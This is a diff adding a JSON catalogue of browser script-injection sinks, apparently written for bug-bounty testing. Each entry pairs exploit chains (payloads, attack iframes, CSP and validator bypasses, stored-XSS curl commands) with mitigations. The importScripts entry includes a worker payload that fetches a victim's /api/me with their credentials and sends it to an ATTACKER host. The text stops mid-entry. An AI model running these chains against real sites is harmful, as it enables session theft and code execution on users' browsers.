@@ -1,0 +1,797 @@
+{
+  "category": "script-injection",
+  "schema_version": "2.0",
+  "sinks": [
+    {
+      "id": "sink-script-src",
+      "name": "script.src",
+      "category": "script-injection",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "script.src",
+        "script.src=",
+        ".src =",
+        "setAttribute('src'",
+        "setAttribute(\"src\""
+      ],
+      "severity": "P1",
+      "severity_note": "P1 when attacker input fully controls the URL (remote JS execution on the origin); P2 when control is partial (path suffix, fixed host) and requires a CDN/JSONP gadget.",
+      "explain": "Assigning attacker-controlled data to the src of a <script> element (script.src = value or setAttribute('src', value)) makes the browser fetch and execute that URL as JavaScript with the full privileges of the page's origin.",
+      "how_it_works": "Unlike eval, the attacker does not inject code text — they point the browser at executable code. Full URL control (any scheme/host) is instant compromise: host the payload and win. Partial control (attacker controls only a path or filename appended to a fixed CDN origin) is still exploitable when the trusted host serves attacker-influenceable content: JSONP endpoints that reflect the callback parameter, user-uploaded files served as text/javascript, or open-redirect-plus-reflection gadgets on the CDN.",
+      "why_it_matters": "This is the highest-impact client-side sink short of full account takeover: one assignment yields persistent-grade remote code execution in the origin, bypassing every HTML sanitizer (no HTML is ever injected). It also underpins supply-chain and JSONP-callback attacks that platforms grade as critical when a third-party host is involved.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "postMessage-data",
+        "localStorage",
+        "xhr-response",
+        "fetch-response"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm the query parameter lands in script.src",
+              "payload": "?u=https://ATTACKER/jlf-trace.js",
+              "command": "open 'https://TARGET/page?u=https://ATTACKER/jlf-trace.js' and inspect the Network panel plus the generated <script> tag in Elements",
+              "indicator": "a script element exists whose src is exactly the supplied URL and the browser issues a request to ATTACKER"
+            },
+            {
+              "action": "Serve the payload and achieve execution",
+              "payload": "?u=https://ATTACKER/x.js",
+              "command": "host x.js containing 'alert(document.domain)' at ATTACKER with header 'Access-Control-Allow-Origin: *' (not required for classic scripts, but avoids CORS-mode surprises) and 'Content-Type: text/javascript', then open 'https://TARGET/page?u=https://ATTACKER/x.js'",
+              "indicator": "the alert fires, proving remote JS execution in the target origin"
+            },
+            {
+              "action": "If a fixed prefix is prepended, use scheme-relative or traversal tricks",
+              "payload": "?u=//ATTACKER/x.js",
+              "command": "when code does script.src = 'https://cdn.example/' + u, test '?u=//ATTACKER/x.js' (collapses only if no path join) and '?u=..%2f..%2f@ATTACKER/x.js' style variants; capture the resolved URL in Network",
+              "indicator": "the resolved request hits ATTACKER instead of the CDN"
+            }
+          ],
+          "eligibility": "Accepted as P1/P2 on all major platforms; remote-script-into-origin is unambiguous. CSP is the gate: check for a script-src that allowlists the attacker host or allows any https: — report CSP state explicitly."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify message data becomes a script src",
+              "payload": "https://ATTACKER/jlf-trace.js",
+              "command": "postMessage('https://ATTACKER/jlf-trace.js','*') from the console on https://TARGET/page and watch Network",
+              "indicator": "a request to ATTACKER is issued for a new script element, and the listener lacks strict origin validation"
+            },
+            {
+              "action": "Execute hosted code cross-origin",
+              "payload": "https://ATTACKER/x.js",
+              "command": "host x.js with 'alert(document.domain)' at ATTACKER and open a page containing <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('https://ATTACKER/x.js','*')</script>",
+              "indicator": "the alert fires inside the target frame"
+            },
+            {
+              "action": "If only a CDN path is accepted, pivot to a JSONP gadget on that CDN",
+              "payload": "https://cdn.example/jsonp?callback=alert(document.domain)//",
+              "command": "verify the gadget first: curl -s 'https://cdn.example/jsonp?callback=alert(document.domain)%2F%2F' and confirm the body starts with 'alert(document.domain)//(', then post that URL as the script src",
+              "indicator": "the alert fires via the trusted-host JSONP response, proving partial-control exploitability"
+            }
+          ],
+          "eligibility": "Accepted everywhere with missing/bypassable origin checks. The JSONP-gadget variant converts a 'partial control, not exploitable' rejection into a valid finding — document the gadget response body."
+        },
+        {
+          "source": "localStorage",
+          "steps": [
+            {
+              "action": "Plant and trace a stored script URL",
+              "payload": "https://ATTACKER/jlf-trace.js",
+              "command": "localStorage.setItem('plugin','https://ATTACKER/jlf-trace.js'); reload https://TARGET/page and watch Network",
+              "indicator": "the stored URL is fetched as a script on load"
+            },
+            {
+              "action": "Persist hosted-code execution",
+              "payload": "https://ATTACKER/x.js",
+              "command": "localStorage.setItem('plugin','https://ATTACKER/x.js'); location.reload() with x.js serving 'alert(document.domain)'",
+              "indicator": "the alert fires on every load"
+            },
+            {
+              "action": "Escalate via a remote write path for the stored key",
+              "payload": "https://ATTACKER/x.js",
+              "command": "find the server feature that syncs this key and set it from a second account",
+              "indicator": "the first account loads the attacker's script after sync — stored remote-code inclusion"
+            }
+          ],
+          "eligibility": "Self-planted storage alone is self-XSS (not eligible); eligible when a cross-account or server write path exists. Remote-JS inclusion is graded higher than inline XSS."
+        }
+      ],
+      "contexts": {
+        "full-url-control": "Attacker controls the entire src: instant win, host 'alert(document.domain)' and serve as text/javascript.",
+        "path-suffix": "Fixed origin + attacker path: look for JSONP endpoints, user-content hosts, and open redirects on the allowed origin.",
+        "jsonp-gadget": "Trusted endpoint reflects the callback parameter: request ?callback=alert(document.domain)// so the response body is valid JS containing your code.",
+        "scheme-relative": "Value starting with '//' inherits the page scheme — useful when the code validates only a prefix loosely."
+      },
+      "waf_notes": "Server WAFs rarely inspect values destined for script.src because no HTML metacharacters are needed — a clean URL sails through. CSP script-src is the decisive control: 'strict-dynamic' or nonce-based policies still allow a script element created by trusted JS (created with createElement and appended), so this sink often bypasses nonces; host/path allowlists decide exploitability. Test data: and javascript: schemes too — script.src='javascript:...' is ignored in modern browsers, but data:text/javascript URLs execute in some legacy engines.",
+      "eligibility": "Top-grade finding (P1 full control, P2 gadget-assisted) on all major platforms. Be explicit about CSP: if script-src blocks the attacker host and no allowlisted gadget exists, report the missing validation as defense-in-depth, not as XSS. Self-XSS via console-pasted assignment is not eligible.",
+      "mitigations": [
+        "Never build script URLs from client input; use a fixed allowlist of module names mapped to known URLs.",
+        "Set CSP script-src to exact hosts with nonces and avoid 'strict-dynamic' when loader code touches client data.",
+        "Validate any unavoidable dynamic src against a strict regex (scheme https, host allowlist, path allowlist) before assignment."
+      ],
+      "related": [
+        "createElement('script') + append",
+        "import() (dynamic)",
+        "dynamic Worker code",
+        "innerHTML"
+      ],
+      "references": [
+        "PortSwigger: DOM-based XSS",
+        "HackTricks: XSS - Cross Site Scripting",
+        "OWASP WSTG: Testing for DOM-based Cross Site Scripting (WSTG-CLNT-01)"
+      ]
+    },
+    {
+      "id": "sink-script-text",
+      "name": "script.text / textContent",
+      "category": "script-injection",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "script.text",
+        "script.textContent",
+        "script.innerHTML",
+        ".text =",
+        ".textContent ="
+      ],
+      "severity": "P2",
+      "severity_note": "P2 when the script element is actually inserted into the document; writing .text on a detached or non-inserted element executes nothing.",
+      "explain": "Setting the text, textContent, or innerHTML of a <script> element defines inline code. When that element is (or becomes) part of the document, the code executes with full origin privileges. Attacker data written into a script body is equivalent to inline XSS with no HTML encoding possible.",
+      "how_it_works": "Two sub-cases. Case 1: the element is already in the DOM and its text is replaced — inline script replacement does NOT reliably re-execute in all engines (existing scripts are marked 'already started'), but if the element is cloned, re-inserted, or freshly created (Case 2), the code runs on insertion. The classic vulnerable pattern is templating: s = document.createElement('script'); s.text = 'var cfg = ' + tainted; document.head.append(s).",
+      "why_it_matters": "Developers treat script.text assignment as 'safe data passing' (e.g. injecting config JSON into a bootstrap script). Any string concatenation into that body is code injection: no encoding layer exists between the attacker and the JS parser. It also slips past HTML sanitizers because the payload never looks like markup.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "postMessage-data",
+        "xhr-response",
+        "window.name"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Trace the fragment into the script body",
+              "payload": "#jlf-trace-1337",
+              "command": "open 'https://TARGET/page#jlf-trace-1337', breakpoint the .text assignment and the append call",
+              "indicator": "the traced value appears inside the script text, and the element is appended to the document"
+            },
+            {
+              "action": "Fire a payload that fits the surrounding code template",
+              "payload": "#alert(document.domain)//",
+              "command": "open 'https://TARGET/page#alert(document.domain)//' in a browser",
+              "indicator": "the alert fires when the freshly created script is inserted"
+            },
+            {
+              "action": "Break a quoted context if the template wraps the value",
+              "payload": "#\";alert(document.domain);//",
+              "command": "open 'https://TARGET/page#\";alert(document.domain);//' when the template is s.text = 'var u = \"' + hash + '\"'",
+              "indicator": "the alert fires; the trailing // comments out the remainder of the template line"
+            }
+          ],
+          "eligibility": "Accepted as DOM XSS; fragment delivery is server-WAF-blind. Confirm the element is actually inserted — a text write on a never-appended element is not exploitable."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify message data reaches the script body",
+              "payload": "jlf-trace-1337",
+              "command": "postMessage('jlf-trace-1337','*') from the console on https://TARGET/page and inspect the generated script element",
+              "indicator": "the posted value is inside the script text and the element enters the DOM"
+            },
+            {
+              "action": "Execute cross-origin",
+              "payload": "alert(document.domain)//",
+              "command": "open a page hosting <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('alert(document.domain)//','*')</script>",
+              "indicator": "the alert fires inside the target frame on script insertion"
+            }
+          ],
+          "eligibility": "Accepted everywhere with missing/bypassable origin checks; quote the listener and the template line in the report."
+        },
+        {
+          "source": "xhr-response",
+          "steps": [
+            {
+              "action": "Confirm an API field is templated into the script body",
+              "payload": "jlf-trace-1337",
+              "command": "curl -s -X POST 'https://TARGET/api/settings' -H 'Cookie: session=SESSION_ID' -H 'Content-Type: application/json' -d '{\"theme\":\"jlf-trace-1337\"}' then load the page and inspect the generated inline script",
+              "indicator": "the stored field appears inside the script body served or built by the page"
+            },
+            {
+              "action": "Store the execution payload and verify as a victim",
+              "payload": "\";alert(document.domain);//",
+              "command": "curl -s -X POST 'https://TARGET/api/settings' -H 'Cookie: session=SESSION_ID' -H 'Content-Type: application/json' -d '{\"theme\":\"\\\";alert(document.domain);//\"}' (escaping per the template quoting) then open the page as a second account",
+              "indicator": "the alert fires in the second account's session when the bootstrap script is built"
+            }
+          ],
+          "eligibility": "Stored XSS with cross-account impact — strong P2. Same-account-only is self-XSS; show a victim view."
+        }
+      ],
+      "contexts": {
+        "js-string": "Taint lands inside a quoted string in the script body: break out with '\";alert(document.domain);//' (or quote-appropriate variant). No HTML encoding applies — only JS string escaping.",
+        "raw-code": "Taint concatenated as bare code: payload is simply 'alert(document.domain)//'.",
+        "json-block": "Taint inside an application/json script block (common for hydration data) does NOT execute — the script type is non-JS. Only exploitable if '</script>' breaks out into HTML, which requires the surrounding page context, not this sink alone."
+      },
+      "waf_notes": "Payloads contain no HTML metacharacters (quotes and semicolons only), so HTML-oriented WAF rules miss them entirely. CSP without 'unsafe-inline' blocks the inline script — but note: if the app uses nonces and copies the nonce onto dynamically created scripts, execution still succeeds. Always capture the CSP and nonce behavior in the PoC.",
+      "eligibility": "Accepted as DOM XSS on all major platforms when insertion and execution are demonstrated. Be honest about the re-execution caveat: overwriting text on an already-executed script may not re-run — use fresh-element PoCs.",
+      "mitigations": [
+        "Pass data to scripts via JSON.parse of a type='application/json' block, never via code concatenation.",
+        "Avoid dynamic inline scripts; move bootstrap config into API responses consumed with fetch.",
+        "CSP without 'unsafe-inline' and without copying nonces into tainted templates."
+      ],
+      "related": [
+        "eval",
+        "innerHTML",
+        "createElement('script') + append",
+        "Function constructor"
+      ],
+      "references": [
+        "MDN: HTMLScriptElement.text",
+        "PortSwigger: DOM-based XSS",
+        "HackTricks: XSS - Cross Site Scripting"
+      ]
+    },
+    {
+      "id": "sink-createelement-script",
+      "name": "createElement('script') + append",
+      "category": "script-injection",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "createElement('script'",
+        "createElement(\"script\"",
+        "createElement('SCRIPT'",
+        "document.createElement"
+      ],
+      "severity": "P2",
+      "severity_note": "P2 as a sink pattern: the creation call is harmless by itself — severity lands when src or text is built from client data and the element is appended. Report the full loader chain, not the createElement call alone.",
+      "explain": "document.createElement('script') followed by setting src/text and appending to the document is the standard programmatic script loader. The sink is the combination: tainted src → remote code inclusion (see script.src); tainted text → inline code injection (see script.text).",
+      "how_it_works": "Dynamically inserted scripts execute whether inserted via appendChild, append, insertBefore, or head.append. Async by default when created this way (async defaults true for dynamic scripts), which matters for payload timing but not exploitability. Under CSP, dynamically created scripts inserted by already-trusted code inherit trust when 'strict-dynamic' is present — a key bypass nuance: nonce-less dynamic insertion succeeds where static markup would be blocked.",
+      "why_it_matters": "Virtually every tag manager, A/B framework, and module loader uses this pattern. When the loader's input (campaign id, experiment name, plugin URL) derives from the URL, storage, or postMessage, the page has a remote-code-inclusion primitive wrapped in trusted-looking code. It is also the canonical answer to 'CSP has nonces, is it still exploitable?' — often yes, via strict-dynamic.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "postMessage-data",
+        "localStorage",
+        "fetch-response"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Trace the query parameter through the loader",
+              "payload": "?plugin=https://ATTACKER/jlf-trace.js",
+              "command": "open 'https://TARGET/page?plugin=https://ATTACKER/jlf-trace.js', breakpoint the createElement line, and follow src assignment and append",
+              "indicator": "a script element with the tainted src is appended and Network shows the fetch to ATTACKER"
+            },
+            {
+              "action": "Serve and execute hosted code",
+              "payload": "?plugin=https://ATTACKER/x.js",
+              "command": "host x.js with 'alert(document.domain)' (Content-Type: text/javascript) and open 'https://TARGET/page?plugin=https://ATTACKER/x.js'",
+              "indicator": "the alert fires, proving remote code inclusion"
+            },
+            {
+              "action": "Test the strict-dynamic CSP bypass if a nonce policy is present",
+              "payload": "?plugin=https://ATTACKER/x.js",
+              "command": "check the CSP header: curl -sI 'https://TARGET/page' | grep -i content-security-policy and look for 'strict-dynamic' next to a nonce, then re-run the same URL — dynamically created scripts by trusted code are still allowed",
+              "indicator": "the script executes despite the nonce-based CSP, confirming strict-dynamic trust inheritance"
+            }
+          ],
+          "eligibility": "Accepted as remote code inclusion (P1/P2). Explicitly note the CSP posture: exploitation under strict-dynamic is a notable report detail."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify message data drives the loader",
+              "payload": "https://ATTACKER/jlf-trace.js",
+              "command": "postMessage('https://ATTACKER/jlf-trace.js','*') from the console on https://TARGET/page and watch Network plus the listener's origin check",
+              "indicator": "a script fetch to ATTACKER occurs and origin validation is absent or weak"
+            },
+            {
+              "action": "Execute hosted code cross-origin",
+              "payload": "https://ATTACKER/x.js",
+              "command": "open a page hosting <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('https://ATTACKER/x.js','*')</script> with x.js serving 'alert(document.domain)'",
+              "indicator": "the alert fires inside the target frame"
+            }
+          ],
+          "eligibility": "Accepted everywhere with missing/bypassable origin checks."
+        },
+        {
+          "source": "localStorage",
+          "steps": [
+            {
+              "action": "Plant and trace a stored loader input",
+              "payload": "https://ATTACKER/jlf-trace.js",
+              "command": "localStorage.setItem('module','https://ATTACKER/jlf-trace.js'); reload https://TARGET/page and watch Network",
+              "indicator": "the stored URL is loaded as a script on every page load"
+            },
+            {
+              "action": "Escalate via a remote write path for the key",
+              "payload": "https://ATTACKER/x.js",
+              "command": "identify the server feature syncing this key and set 'https://ATTACKER/x.js' from a second account, x.js serving 'alert(document.domain)'",
+              "indicator": "the first account executes the attacker's hosted code after sync — stored remote inclusion, not self-XSS"
+            }
+          ],
+          "eligibility": "Self-planted is self-XSS (not eligible); the synced/cross-account variant is a strong stored finding."
+        }
+      ],
+      "contexts": {
+        "src-taint": "Loader sets .src from input: remote code inclusion class. Payloads are URLs, not code.",
+        "text-taint": "Loader sets .text/.textContent from input: inline injection class. Payloads are JS with '//' tail.",
+        "nested-attribute": "Input lands in a data-* attribute that a later stage copies into src — trace the full chain in the report so triage can reproduce."
+      },
+      "waf_notes": "No markup is injected, so HTML-centric WAF rules do not fire. CSP analysis is essential: nonce+strict-dynamic still allows trusted-code dynamic insertion; host allowlists decide the rest. Some loaders validate with URL parsing — test '//ATTACKER/x.js', backslash variants 'https:\\\\ATTACKER/x.js', and 'https://allowed-host@ATTACKER/x.js' userinfo confusion against the validator.",
+      "eligibility": "Accepted as script-injection / remote code inclusion on all major platforms. Never report the createElement line alone as a vulnerability — the report must show tainted src or text plus the append step and the fetch firing.",
+      "mitigations": [
+        "Map loader inputs through a fixed allowlist of module identifiers to known-good URLs.",
+        "Remove 'strict-dynamic' from CSP when loader inputs are client-influenceable.",
+        "Validate URLs with the URL constructor against an explicit host allowlist, rejecting userinfo and non-https schemes."
+      ],
+      "related": [
+        "script.src",
+        "script.text / textContent",
+        "import() (dynamic)",
+        "dynamic Worker code"
+      ],
+      "references": [
+        "MDN: Document.createElement()",
+        "PortSwigger: DOM-based XSS",
+        "HackTricks: XSS - Cross Site Scripting"
+      ]
+    },
+    {
+      "id": "sink-dynamic-import",
+      "name": "import() (dynamic)",
+      "category": "script-injection",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "import(",
+        "dynamic import",
+        "await import"
+      ],
+      "severity": "P1",
+      "severity_note": "P1 with a fully tainted specifier (remote module execution); P2 when the specifier is a tainted path joined to a trusted base and a reflection/JSONP gadget exists on that base.",
+      "explain": "import(specifier) loads and executes an ES module at runtime. specifier is a string — and if attacker data reaches it, the browser fetches and executes that module with the full authority of the importing origin. Module code runs in strict mode with access to the DOM and same-origin fetch().",
+      "how_it_works": "Absolute specifiers ('https://ATTACKER/x.js') are fetched cross-origin but REQUIRE CORS (modules are loaded with CORS mode) — the attacker controls the server, so they simply send 'Access-Control-Allow-Origin: *'. Relative specifiers resolve against the page URL, so a tainted relative path stays same-origin and needs a same-origin reflection gadget. Bare specifiers ('lodash') resolve via import maps — a separate attack surface if the import map itself is influenceable.",
+      "why_it_matters": "SPA code-splitting and plugin architectures call import() with route- or user-derived specifiers everywhere. This sink is remote code execution with a cleaner exploit story than eval: no encoding, no sandboxing, and the loaded module can re-export a persistent foothold (register listeners, patch fetch) that survives route changes.",
+      "exploitable_when": [
+        "location.hash",
+        "location.search",
+        "postMessage-data",
+        "localStorage",
+        "spa-hash-router-param"
+      ],
+      "chains": [
+        {
+          "source": "location.hash",
+          "steps": [
+            {
+              "action": "Trace the fragment into the import specifier",
+              "payload": "#/view/https://ATTACKER/jlf-trace.js",
+              "command": "open 'https://TARGET/app#/view/https://ATTACKER/jlf-trace.js' (adjust the router shape) and watch Network for the module fetch",
+              "indicator": "a module request to ATTACKER is issued and DevTools shows it loaded with type 'module'"
+            },
+            {
+              "action": "Serve the module and execute",
+              "payload": "#/view/https://ATTACKER/x.mjs",
+              "command": "host x.mjs containing 'alert(document.domain)' with headers 'Content-Type: text/javascript' and 'Access-Control-Allow-Origin: *', then open the URL",
+              "indicator": "the alert fires — CORS is satisfied because YOU control the module server"
+            },
+            {
+              "action": "If only a path segment is tainted, pivot to a same-origin reflection gadget",
+              "payload": "#/view/../../api/echo?body=alert(document.domain)",
+              "command": "find an endpoint that reflects request data as JS (echo APIs, JSONP) and craft the specifier so the resolved URL returns executable code",
+              "indicator": "the resolved same-origin module executes the reflected code"
+            }
+          ],
+          "eligibility": "Accepted as P1/P2 on all major platforms. Fragment/router delivery is server-WAF-blind. Document the CORS header on your module host so triage does not misread a network error as non-exploitability."
+        },
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Verify message data becomes an import specifier",
+              "payload": "https://ATTACKER/jlf-trace.js",
+              "command": "postMessage('https://ATTACKER/jlf-trace.js','*') from the console on https://TARGET/page and watch Network",
+              "indicator": "a module fetch to ATTACKER occurs and the listener lacks strict origin validation"
+            },
+            {
+              "action": "Execute a hosted module cross-origin",
+              "payload": "https://ATTACKER/x.mjs",
+              "command": "open a page hosting <iframe src=\"https://TARGET/page\"></iframe><script>onload=()=>frames[0].postMessage('https://ATTACKER/x.mjs','*')</script> with x.mjs serving 'alert(document.domain)' plus ACAO:*",
+              "indicator": "the alert fires inside the target frame"
+            }
+          ],
+          "eligibility": "Accepted everywhere with missing/bypassable origin checks."
+        },
+        {
+          "source": "spa-hash-router-param",
+          "steps": [
+            {
+              "action": "Map the router param that selects the lazy chunk",
+              "payload": "#/admin/jlf-trace",
+              "command": "open 'https://TARGET/app#/admin/jlf-trace' and diff the requested chunk URL against the param value",
+              "indicator": "the param is concatenated into the chunk path (e.g. import('./views/'+name+'.js'))"
+            },
+            {
+              "action": "Escape the views directory with traversal",
+              "payload": "#/admin/..//../../ATTACKER-HOST/x",
+              "command": "test '#/admin/..%2f..%2f//ATTACKER/x' and double-encoded variants; capture the final resolved URL in Network",
+              "indicator": "the resolved specifier escapes the intended directory — the final URL determines whether an attacker host or a same-origin gadget is reachable"
+            },
+            {
+              "action": "Execute via the reachable URL",
+              "payload": "#/admin/https://ATTACKER/x.mjs",
+              "command": "if full-specifier control exists, serve x.mjs with 'alert(document.domain)' and ACAO:*; if only traversal exists, point it at a same-origin reflection endpoint returning JS",
+              "indicator": "the alert fires through the router-driven import"
+            }
+          ],
+          "eligibility": "SPA lazy-load import is a common modern finding; accepted on major platforms. Traversal-only control graded by what the resolved URL can reach — be explicit."
+        }
+      ],
+      "contexts": {
+        "absolute-url": "Full control: serve the module yourself with ACAO:* — modules require CORS, classic scripts do not; this difference decides PoC reliability.",
+        "relative-join": "import('./chunks/'+name): traversal and encoding tricks decide reach; same-origin gadgets (echo endpoints, JSONP) complete the chain.",
+        "bare-specifier": "Resolves via import maps; if you can influence the import map (stored config, proto pollution), map a benign name to an attacker URL — report as a chained finding."
+      },
+      "waf_notes": "Specifier strings are URL-shaped, not markup — server WAFs rarely flag them, and router delivery keeps them in the fragment anyway. CSP script-src applies to module fetches, but note: 'strict-dynamic' does NOT gate import() specifiers the way it gates created script elements in all browsers — test in the target's actual browser. Module MIME-type enforcement (strict MIME checking for modules) rejects text/html responses, killing some reflection gadgets — serve correct Content-Type in PoCs.",
+      "eligibility": "Top-grade finding when a full specifier is attacker-controlled. Honest limits: CORS (you satisfy it yourself), MIME-type checks (kills HTML-reflection gadgets), and CSP script-src host allowlists. Self-import via console is self-XSS and not eligible.",
+      "mitigations": [
+        "Never interpolate client data into import() specifiers; map fixed keys to static chunk URLs.",
+        "Keep import maps static and integrity-pinned.",
+        "CSP script-src with exact hosts; avoid wildcards that cover user-content or JSONP endpoints."
+      ],
+      "related": [
+        "script.src",
+        "createElement('script') + append",
+        "dynamic Worker code",
+        "eval"
+      ],
+      "references": [
+        "MDN: import()",
+        "PortSwigger: DOM-based XSS",
+        "HackTricks: XSS - Cross Site Scripting"
+      ]
+    },
+    {
+      "id": "sink-importscripts",
+      "name": "importScripts",
+      "category": "script-injection",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "importScripts",
+        "importScripts("
+      ],
+      "severity": "P2",
+      "severity_note": "P2: worker-context code execution — no DOM access, but full access to same-origin fetch with the page's credentials, IndexedDB, and any secrets passed to the worker. Not a page-XSS; report impact accordingly.",
+      "explain": "importScripts(url, ...) runs inside Web Workers and synchronously loads and executes classic scripts into the worker's global scope. If the URL is attacker-controlled (postMessage into the worker, a shared query parameter, or storage the worker reads), the attacker's code executes in the worker context.",
+      "how_it_works": "Classic worker scripts are loaded WITHOUT CORS requirements (same as <script src>), so a cross-origin attacker host works out of the box. The worker has no DOM, but it shares the origin: fetch('/api/...') from the worker carries the user's cookies and returns full responses, which the worker then postMessages anywhere the attacker's code likes. Workers also commonly receive tokens/keys via postMessage for crypto or sync tasks.",
+      "why_it_matters": "Workers are a blind spot in most reviews: triage hears 'no DOM access' and underestimates it, but same-origin credentialed fetch plus IndexedDB access is equivalent to full API compromise of the victim's session. It is also a stealthy persistence layer — a poisoned worker keeps running while the tab is open, invisible in the page's DOM.",
+      "exploitable_when": [
+        "postMessage-data",
+        "location.search",
+        "localStorage"
+      ],
+      "chains": [
+        {
+          "source": "postMessage-data",
+          "steps": [
+            {
+              "action": "Trace a message into the worker's importScripts",
+              "payload": "https://ATTACKER/jlf-trace.js",
+              "command": "identify the worker (DevTools > Sources > Workers), then postMessage({'script':'https://ATTACKER/jlf-trace.js'},'*') from the page console so it is forwarded to the worker",
+              "indicator": "the worker issues a request to ATTACKER (visible in the worker's Network view)"
+            },
+            {
+              "action": "Execute code in the worker context",
+              "payload": "https://ATTACKER/w.js",
+              "command": "host w.js containing 'fetch(\"/api/me\",{credentials:\"include\"}).then(r=>r.text()).then(t=>fetch(\"https://ATTACKER/c?d=\"+btoa(t)))' and deliver the URL via the same message",
+              "indicator": "your listener receives the victim's /api/me response — credentialed same-origin fetch from the worker"
+            },
+            {
+              "action": "Prove scope honestly",
+              "payload": "https://ATTACKER/w2.js",
+              "command": "host w2.js with 'try{document}catch(e){postMessage(\"no-dom\")}' and observe the result",
+              "indicator": "the worker reports no DOM — document this in the report so severity is assessed on API/IndexedDB impact, not page XSS"
+            }
+          ],
+          "eligibility": "Accepted on major platforms as session/API compromise via worker code execution when a remote trigger exists. Severity hinges on what the worker can reach: credentialed fetch = session theft equivalent; pure compute workers with no secrets may grade lower. State scope precisely."
+        },
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm a query parameter feeds the worker's importScripts",
+              "payload": "?lang=https://ATTACKER/jlf-trace.js",
+              "command": "open 'https://TARGET/page?lang=https://ATTACKER/jlf-trace.js' and watch the worker's network activity",
+              "indicator": "the worker fetches the supplied URL as a classic script"
+            },
+            {
+              "action": "Execute the worker payload",
+              "payload": "?lang=https://ATTACKER/w.js",
+              "command": "host w.js with the credentialed-fetch exfiltration code and open the URL as a logged-in test account",
+              "indicator": "your listener receives API data fetched with the test account's cookies"
+            }
+          ],
+          "eligibility": "Accepted with a demonstrated credentialed-fetch impact; query delivery crosses the server but URLs carry no markup, so WAF friction is low."
+        },
+        {
+          "source": "localStorage",
+          "steps": [
+            {
+              "action": "Plant and trace a stored worker-script URL",
+              "payload": "https://ATTACKER/jlf-trace.js",
+              "command": "localStorage.setItem('workerExt','https://ATTACKER/jlf-trace.js'); reload https://TARGET/page and watch the worker's requests",
+              "indicator": "the worker imports the stored URL on load"
+            },
+            {
+              "action": "Escalate via a remote write path",
+              "payload": "https://ATTACKER/w.js",
+              "command": "find the server-synced feature for this key and set the payload URL from a second account",
+              "indicator": "the first account's worker imports attacker code after sync — a persistent, DOM-invisible foothold"
+            }
+          ],
+          "eligibility": "Self-planted is self-XSS (not eligible); the synced variant is a strong stored finding — emphasize the persistence and invisibility."
+        }
+      ],
+      "contexts": {
+        "classic-worker": "No CORS on importScripts targets; any reachable JS file works. Data: URLs are blocked for importScripts in modern browsers — use an HTTPS host.",
+        "module-worker": "importScripts is unavailable in module workers (type:'module'); if the worker is a module worker, look for dynamic import() inside it instead.",
+        "shared-worker": "SharedWorkers amplify impact across tabs of the same origin — one poisoned import affects every attached tab."
+      },
+      "waf_notes": "Worker fetches carry the Origin/Referer of the page but rarely trigger WAF rules (URL-shaped values). CSP script-src and worker-src govern importScripts — a missing worker-src falls back to script-src, so check both. Reports should note that DevTools worker inspection requires enabling worker debugging, which some triagers miss.",
+      "eligibility": "Legitimate but frequently misunderstood finding: lead the report with the credentialed-fetch impact (session-equivalent), not 'XSS in worker'. Self-XSS console variants are not eligible.",
+      "mitigations": [
+        "Hardcode importScripts URLs; never derive them from messages, storage, or query data.",
+        "Validate worker-bound postMessage with origin and schema checks before use.",
+        "Set CSP worker-src (and script-src) to exact same-origin paths."
+      ],
+      "related": [
+        "dynamic Worker code",
+        "import() (dynamic)",
+        "script.src",
+        "postMessage send with '*' targetOrigin"
+      ],
+      "references": [
+        "MDN: importScripts()",
+        "HackTricks: XSS - Cross Site Scripting"
+      ]
+    },
+    {
+      "id": "sink-jsonp-callback",
+      "name": "JSONP callback parameter",
+      "category": "script-injection",
+      "languages": [
+        "javascript"
+      ],
+      "patterns": [
+        "callback=",
+        "jsonp",
+        "JSONP",
+        "callback:"
+      ],
+      "severity": "P2",
+      "severity_note": "P2: reflected callback names execute as JS in the including origin — the impact lands on the site that CONSUMES the JSONP endpoint, and on the endpoint host if its own pages include it. Same-site JSONP with reflected callback is often graded like reflected XSS.",
+      "explain": "JSONP endpoints return JavaScript of the form callbackName({...data...}). The callback name is taken from a query parameter and reflected into an executable response. If the name is not restricted to a safe identifier alphabet, an attacker puts arbitrary code into the response: ?callback=alert(document.domain)// yields 'alert(document.domain)//({...})' — live code the moment any page includes it as a script.",
+      "how_it_works": "Two attack surfaces. Surface 1 (against the endpoint host's users): trick a victim into loading the crafted JSONP URL as a script on a page of the same origin, or find a page whose JSONP callback parameter is attacker-influenceable via URL — the reflected code runs in that origin. Surface 2 (against any consumer): if an app builds its JSONP callback name from client data (e.g. location.search) before requesting a third-party JSONP endpoint, the attacker poisons the callback field and gets code execution in the app's origin. Content-Type matters: responses served as text/javascript or application/javascript execute; some browsers refuse execution on strict JSON MIME types.",
+      "why_it_matters": "JSONP survives in legacy APIs, ad networks, and analytics. Callback reflection is one of the most reliable 'partial control to full execution' gadgets: it converts a script.src path-suffix limitation into complete compromise without hosting anything. Alphabet-filtered callbacks (only [a-zA-Z0-9_$]) are the standard defense — finding a filter that forgets '.' or misses Unicode identifiers is a classic bypass.",
+      "exploitable_when": [
+        "location.search",
+        "location.hash",
+        "postMessage-data",
+        "document.referrer"
+      ],
+      "chains": [
+        {
+          "source": "location.search",
+          "steps": [
+            {
+              "action": "Confirm callback reflection into an executable response",
+              "payload": "?callback=jlfTrace1337",
